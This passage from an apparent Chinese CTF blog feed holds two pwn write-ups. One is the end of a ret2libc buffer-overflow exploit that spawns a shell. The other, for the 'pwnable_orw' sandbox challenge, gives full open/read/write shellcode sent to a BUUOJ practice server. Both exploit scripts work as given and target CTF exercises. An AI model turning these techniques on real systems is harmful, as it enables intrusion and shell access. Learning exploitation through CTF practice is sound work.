libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>
offset<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>

system_addr<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>脚本一跑，cat flag就得到flag了</p>
<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_orw</title>
    <url>/2022/01219b7a.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
<p>于是只好拿网上的图片来看</p>
<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
<span class="token comment">#coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27261</span><span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x4;mov ebx,0x1;int 0x80'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'shellcode:'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
